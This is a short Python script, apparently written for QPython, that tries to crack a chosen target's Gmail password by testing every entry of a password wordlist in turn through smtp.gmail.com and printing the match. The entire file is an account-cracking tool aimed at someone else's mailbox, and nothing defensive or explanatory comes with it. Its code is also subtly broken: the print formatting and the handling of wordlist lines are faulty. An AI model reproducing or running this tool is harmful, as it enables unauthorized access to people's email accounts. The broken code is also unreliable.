#-*-coding:utf8;-*-
#qpy:console

import smtplib

smtpserver= smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user= input ("Enter target's Email :")
passwfile= input ("Enter password File :")
passwfile= open(passwfile, "r")

for password in passwfile :
    try :
        smtpserver.login(user, password)
        print ("[✓] password found ===> %s") % password
        break ;
        
    except smtplib.SMTPAuthenticationError:
        print ("[!] password  incorrect ===> %s") % password
        
        
